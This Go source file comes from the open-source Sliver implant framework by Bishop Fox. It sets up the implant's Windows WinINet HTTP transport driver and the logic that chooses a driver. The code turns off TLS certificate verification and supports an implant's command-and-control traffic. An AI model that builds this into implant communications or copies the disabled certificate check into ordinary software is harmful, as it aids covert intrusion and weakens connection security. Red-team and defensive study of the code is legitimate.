package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net/url"

	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient/drivers/win/wininet"
)

// WininetDriver - Initialize a Wininet driver (Windows only)
func WininetDriver(origin string, secure bool, proxyURL *url.URL, opts *HTTPOptions) (HTTPDriver, error) {
	if proxyURL != nil {
		// support could be added in the future
		return nil, fmt.Errorf("wininet driver does not support manual proxy settings but got proxy URL %s", proxyURL)
	}

	wininetClient, err := wininet.NewClient(userAgent)
	if err != nil {
		return nil, err
	}
	wininetClient.TLSClientConfig.InsecureSkipVerify = true
	wininetClient.AskProxyCreds = opts.AskProxyCreds
	return wininetClient, nil
}

func getHTTPClientDriverOptions(opts *HTTPOptions) []HTTPDriverType {
	var drivers []HTTPDriverType

	switch opts.Driver {

	case goHTTPDriver:
		drivers = append(drivers, GoHTTPDriverType)

	case wininetDriver:
		drivers = append(drivers, WininetHTTPDriverType)

	default:
		drivers = append(drivers, WininetHTTPDriverType)
		drivers = append(drivers, GoHTTPDriverType)
	}

	return drivers
}

func (d HTTPDriverType) GetImpl() func(string, bool, *url.URL, *HTTPOptions) (HTTPDriver, error) {
	switch d {
	case WininetHTTPDriverType:
		return WininetDriver
	case GoHTTPDriverType:
		return GoHTTPDriver
	default:
		return GoHTTPDriver
	}
}
